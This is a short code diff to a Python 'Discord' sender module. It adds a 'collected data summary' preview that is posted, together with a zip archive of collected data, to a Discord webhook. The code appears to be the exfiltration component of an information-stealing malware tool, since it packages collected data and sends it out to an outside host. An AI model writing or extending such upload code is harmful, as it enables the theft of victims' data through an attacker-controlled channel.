@@ -25,7 +25,7 @@ class Discord(AbstractSender):
         - tuple: A tuple of content type, body, and Discord webhook.
         """
         content_type, body = self._encoder.encode(
-            [],
+            [("content", self.__preview)],
             [("file", f"{self.__zip_name}.zip", self.__data)]
         )
 
@@ -49,19 +49,21 @@ class Discord(AbstractSender):
 
         urlopen(query)
 
-    def run(self, zip_name: str, data: BytesIO) -> None:
+    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
         """
         Launches the sender module.
 
         Parameters:
         - zip_name [str]: Archive name.
         - data [BytesIO]: BytesIO object.
+        - preview [str]: Collected data summary.
 
         Returns:
         - None.
         """
         self.__zip_name = zip_name
         self.__data = data
+        self.__preview = preview
 
         try:
 
